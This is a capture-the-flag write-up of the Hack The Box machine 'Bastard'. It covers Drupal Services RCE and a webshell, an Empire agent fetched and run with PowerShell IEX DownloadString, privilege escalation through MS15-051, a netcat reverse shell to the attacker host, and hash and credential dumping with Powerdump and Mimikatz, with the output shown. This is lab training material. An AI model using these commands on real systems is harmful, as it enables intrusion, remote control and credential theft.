# Hackthebox Bastard

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Drupal - Remote Code Execution
2. Establish foothold using Empire
3. MS15-051 Windows ClientCopyImage Win32k Exploit


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Thu Dec 27 11:26:07 2018 as: nmap -v -sV -p- -T4 -oA bastard_full 10.10.10.9                                                                                                
Nmap scan report for 10.10.10.9
Host is up (0.067s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So visiting the webpage on port 80 we clearly see that we have a drupal site running here. We would like to know the version of drupal that is running.

Checking the page source we see the following line: `<meta name="Generator" content="Drupal 7 (http://drupal.org)" />` 

So this narrows it down to Drupal 7.

Another file we could check is the chengelog.txt file, which is a default file on drupal installs.

Requesting http://10.10.10.9/changelog.txt we see the exact drupal version in the header: `Drupal 7.54, 2017-02-01`

Excellent, so let's check for known exploits.

```
root@kali:~/htb# searchsploit drupal 7
--------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                 |  Path
                                                                                                                                                               | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                    | exploits/php/webapps/1821.php
Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                  | exploits/php/webapps/27020.txt
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                              | exploits/php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                               | exploits/php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                    | exploits/php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                    | exploits/php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                       | exploits/php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                         | exploits/php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                             | exploits/php/webapps/41564.php
Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                        | exploits/php/webapps/3313.pl
Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                                  | exploits/php/webapps/33706.txt
Drupal < 7.34 - Denial of Service                                                                                                                              | exploits/php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                       | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                    | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                            | exploits/php/webapps/44449.rb
Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                         | exploits/php/webapps/25493.txt
Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                  | exploits/php/remote/40144.php
Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                        | exploits/php/webapps/35397.txt
Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                                 | exploits/php/webapps/37453.php
Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                   | exploits/php/webapps/35072.txt
Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                              | exploits/php/remote/40130.rb
Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                              | exploits/php/webapps/44501.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

According to exploit db we have a couple of potential exploits for drupal 7.54:

- Drupal 7.x Module Services - Remote Code Execution
- Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution


Running droopescan on the site also verifies the version and shows the following infomation(bear in mind that this scan is slow and very noisy):

```
root@kali:~/htb/bastard# droopescan scan drupal -u http://10.10.10.9
[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

[+] Possible version(s):
    7.54

[+] Plugins found:
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    image http://10.10.10.9/modules/image/
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/

[+] Scan finished (1:00:48.424477 elapsed)
```

Droopscan confirms the Drupal version and also fingerprints some installed themes and plugins.

## Initial Compromise

### Drupal 7.x Module Services - Remote Code Execution

So let's try the first potential exploit we found. More info about the vuln can be found here: https://www.ambionics.io/blog/drupal-services-module-rce

We need to modifiy the exploit a bit, change the url, and I also changed the webshell that gets uploaded to a simple one.

Next we can run the exploit against the victim.

```
root@kali:~/htb/bastard# php drupal_exploit.php 
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/test.php
```
So it seems that our shell got uploaded.

We can the execute commands like this `http://10.10.10.9/test.php?cmd=systeminfo`

```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ££
System Boot Time:          27/12/2018, 12:23:47 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 28/7/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.588 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.617 MB
Virtual Memory: In Use:    478 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
                                 [01]: 10.10.10.9
```

## Establish Foothold

The first thing I usually do when I have some form of initial foothold on a system is to upgrade our shell. This is because some tasks and exploits during our privesc phase may require a full TTY to work. Trust me, I have learned this the hard way.

To get a good foothold on the box I decided to upload a Empire agent to work from. So I create a HTTP listener in Empire and copy the powershell launcher into a file called "empire_launcher.ps1".

We can then download and execute it with powershell from our webshell with the following command: `echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/empire_launcher.ps1') | powershell -noprofile -`

The URL would look like this:

`http://10.10.10.9/test.php?cmd=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/empire_launcher.ps1') | powershell -noprofile -`


Then we just wait for empire to catch the callback of our agent:

```
(Empire) > [*] Sending POWERSHELL stager (stage 1) to 10.10.10.9
[*] New agent M91C3A5F checked in
[+] Initial agent M91C3A5F from 10.10.10.9 now active (Slack)
[*] Sending agent (stage 2) to M91C3A5F at 10.10.10.9

(Empire) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen                                                                                    
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------                                                                                    
 M91C3A5F ps 10.10.10.9      BASTARD           NT AUTHORITY\IUSR       powershell         2924   5/0.0    2018-12-27 14:02:11                        
```

## Pivilege Escalation

A good way to start the privesc is to use some enumeration scripts/modules. For Windows I usually use the following, depending on my foothold:

- Powerup
- Sherlock.ps1
- Metasploit Local Exploit Suggester

So now we can use the agent top mount some privesc checks. First let's run PowerUp on the box through empire:

```
(Empire: M91C3A5F) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > execute
[*] Tasked M91C3A5F to run TASK_CMD_JOB
[*] Agent M91C3A5F tasked with task ID 1
[*] Tasked agent M91C3A5F to run module powershell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > [*] Agent M91C3A5F returned results.
Job started: H8CVSY
[*] Valid results returned by 10.10.10.9

(Empire: M91C3A5F) > [*] Agent M91C3A5F returned results.

[*] Running Invoke-AllChecks
                                                            
[*] Checking if user is in a local group with administrative privileges...

[*] Checking for unquoted service paths...
                           
[*] Checking service executable and argument permissions...
                                       
[*] Checking service permissions...

[*] Checking %PATH% for potentially hijackable DLL locations...

Permissions       : AppendData/AddSubdirectory
ModifiablePath    : C:\oracle\ora90\bin
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\bin
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'

Permissions       : WriteData/AddFile
ModifiablePath    : C:\oracle\ora90\bin
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\bin
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\bin\wlbsctrl.dll'

Permissions       : AppendData/AddSubdirectory
ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.0050
                    3\bin\mswin32-x86\wlbsctrl.dll'

Permissions       : WriteData/AddFile
ModifiablePath    : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
IdentityReference : BUILTIN\Users
%PATH%            : C:\oracle\ora90\Apache\Perl\5.00503\bin\mswin32-x86
AbuseFunction     : Write-HijackDll -DllPath 'C:\oracle\ora90\Apache\Perl\5.0050
                    3\bin\mswin32-x86\wlbsctrl.dll'

[*] Checking for AlwaysInstallElevated registry key...

[*] Checking for Autologon credentials in registry...

[*] Checking for modifidable registry autoruns and configs...

[*] Checking for modifiable schtask files/configs...

[*] Checking for unattended install files...

[*] Checking for encrypted web.config strings...

[*] Checking for encrypted application pool and virtual directory passwords...

[*] Checking for plaintext passwords in McAfee SiteList.xml files....

[*] Checking for cached Group Policy Preferences .xml files....

Invoke-AllChecks completed!
[*] Valid results returned by 10.10.10.9
```

Nothing really interesting there. Then I usually run a powershell script called Sherlock that checks for potential kernel exploits on the system.

We can invoke and run the script from our agent with the "scriptimport" and "scriptexcecute" commands in empire.

```
(Empire: M91C3A5F) > scriptimport ../../privesc/Sherlock.ps1
[*] Tasked M91C3A5F to run TASK_SCRIPT_IMPORT
[*] Agent M91C3A5F tasked with task ID 2
(Empire: M91C3A5F) > sc[*] Agent M91C3A5F returned results.
script successfully saved in memory
[*] Valid results returned by 10.10.10.9

(Empire: M91C3A5F) > scriptcmd Find-AllVulns
[*] Tasked M91C3A5F to run TASK_SCRIPT_COMMAND
[*] Agent M91C3A5F tasked with task ID 3
(Empire: M91C3A5F) > [*] Agent M91C3A5F returned results.
Job started: G492TW
[*] Valid results returned by 10.10.10.9
```

Results of Sherlock:

```
(Empire: M91C3A5F) > [*] Agent M91C3A5F returned results.
                      
                                                                               
Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015      
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

[*] Valid results returned by 10.10.10.9
```

### MS15-051 Windows ClientCopyImage Win32k Exploit

So we have a couple of potential exploits. Let's work our way down the list with MS15-051 as the first one.

I downloaded the exploit from this github repo: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051.

Upload exploit through empire:

```
(Empire: ZMXF1HK2) > upload ../../../htb/bastard/ms15-051x64.exe
[*] Tasked agent to upload ms15-051x64.exe, 54 KB
[*] Tasked ZMXF1HK2 to run TASK_UPLOAD                   
[*] Agent ZMXF1HK2 tasked with task ID 9            
```

We should then be able to execute the exploit through our webshell with a command that we want to run as admin as the argument: 

Example running whoami: `http://10.10.10.9/test.php?cmd=ms15-051x64.exe whoami`

```
[#] ms15-051 fixed by zcgonvh [!] process with pid: 2884 created. ============================== nt authority\system nt authority\system
```
Sweet so we can execute commands as system. Let's get a proper system shell using netcat.

To do this I first uploaded nc.exe through our empire stager, then I ran nc through the webshell and exploit: `http://10.10.10.9/test.php?cmd=ms15-051x64.exe "nc.exe -e cmd 10.10.14.12 443"`

```
root@kali:~/htb/bastard# nc -lvp 443
listening on [any] 443 ...
10.10.10.9: inverse host lookup failed: Unknown host
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.9] 56906
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

We could also use the exploit to get a privileged empire agent running on the host'`http://10.10.10.9/test.php?cmd=ms15-051x64.exe%20%22powershell.exe -noprofile IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/empire_launcher.ps1')`

```
(Empire: agents) > list

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------
 AUL36ZV2 ps 10.10.10.9      BASTARD           NT AUTHORITY\IUSR       powershell         2060   5/0.0    2018-12-28 09:34:40
 9R6D2HAK ps 10.10.10.9      BASTARD           *HTB\SYSTEM             powershell         2520   5/0.0    2018-12-28 09:34:44
```

The * on the second agent means that it is running in an elevated context.

## Dumping Credentials

To dump some credentials we can use existing modules in Empire.

### Powerdump

Dumps hashes from the local system using Posh-SecMod's Invoke-PowerDump.    

```
Empire: powershell/credentials/powerdump) > execute
[*] Tasked 9R6D2HAK to run TASK_CMD_JOB
[*] Agent 9R6D2HAK tasked with task ID 1
[*] Tasked agent 9R6D2HAK to run module powershell/credentials/powerdump
(Empire: powershell/credentials/powerdump) > [*] Agent 9R6D2HAK returned results.
Job started: 3PSF6D
[*] Valid results returned by 10.10.10.9
[*] Agent 9R6D2HAK returned results.

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
dimitris:1004:aad3b435b51404eeaad3b435b51404ee:57544bb8930967eee7f44d46f8bfe59d:::
```
### Mimikatz logonpasswords:

This will run PowerSploit's Invoke-Mimikatz function to extract plaintext credentials from memory.

```
(Empire: powershell/credentials/mimikatz/logonpasswords) > execute                                                                                                                                      
[*] Tasked 9R6D2HAK to run TASK_CMD_JOB                                                                                                                                                                 
[*] Agent 9R6D2HAK tasked with task ID 2                                                                                                                                                                
[*] Tasked agent 9R6D2HAK to run module powershell/credentials/mimikatz/logonpasswords                                                                                                                  
(Empire: powershell/credentials/mimikatz/logonpasswords) >                                                                                                                                              
(Empire: powershell/credentials/mimikatz/logonpasswords) > [*] Agent 9R6D2HAK returned results.                                                                                                         
Job started: EZ3H28                                                                                                                                                                                     
[*] Valid results returned by 10.10.10.9                                                                                                                                                                
                                                                                                                                                                                                        
(Empire: powershell/credentials/mimikatz/logonpasswords) > [*] Agent 9R6D2HAK returned results.                                                                                                         
Hostname: Bastard / authority\system-authority\system                                                                                                                                                   
                                                                                                                                                                                                        
  .#####.   mimikatz 2.1.1 (x64) built on Nov 12 2017 15:32:00                                                                                                                                          
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                             
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                                
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                                                                                  
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                               
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                                                                               
                                                                                                                                                                                                        
mimikatz(powershell) # sekurlsa::logonpasswords                                                                                                                                                         
                                                                                                                                                                                                        
Authentication Id : 0 ; 272876 (00000000:000429ec)                                                                                                                                                      
Session           : Service from 0                                                                                                                                                                      
User Name         : Drupal                                                                                                                                                                              
Domain            : IIS APPPOOL                                                                                                                                                                         
Logon Server      : (null)                                                                                                                                                                              
Logon Time        : 27/12/2018 12:27:18 μμ                                                                                                                                                              
SID               : S-1-5-82-3010057725-1710545986-1225023738-1715116939-3468215619                                                                                                                     
        msv :                                                                                                                                                                                           
        tspkg :                                                                                                                                                                                         
        wdigest :                                                                                                                                                                                       
         * Username : BASTARD$                                                                                                                                                                          
         * Domain   : HTB                                                                                                                                                                               
         * Password : (null)                                                                                                                                                                            
        kerberos :                                                                                                                                                                                      
        ssp :                                                                                                                                                                                           
        credman :                                                                                                                                                                                       
                                                                                                                                                                                                        
Authentication Id : 0 ; 996 (00000000:000003e4)                                                                                                                                                         
Session           : Service from 0                                                                                                                                                                      
User Name         : BASTARD$                                                                                                                                                                            
Domain            : HTB                                                                                                                                                                                 
Logon Server      : (null)                                                                                                                                                                              
Logon Time        : 27/12/2018 12:23:58 μμ                                                                                                                                                              
SID               : S-1-5-20                                                                                                                                                                            
        msv :                                                                                                                                                                                           
        tspkg :                                                                                                                                                                                         
        wdigest :                                                                                                                                                                                       
         * Username : BASTARD$                                                                                                                                                                          
         * Domain   : HTB                                                                                                                                                                               
         * Password : (null)                                                                                                                                                                            
        kerberos :                                                                                                                                                                                      
         * Username : bastard$                                                                                                                                                                          
         * Domain   : HTB                                                                                                                                                                               
         * Password : (null)                                                                                                                                                                            
        ssp :                                                                                                                                                                                           
        credman :  

        Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 27/12/2018 12:23:59 μμ
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 27/12/2018 12:23:58 μμ
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : BASTARD$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 27/12/2018 12:23:58 μμ
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : BASTARD$
         * Domain   : HTB
         * Password : (null)
        kerberos :
         * Username : bastard$
         * Domain   : HTB
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```                             
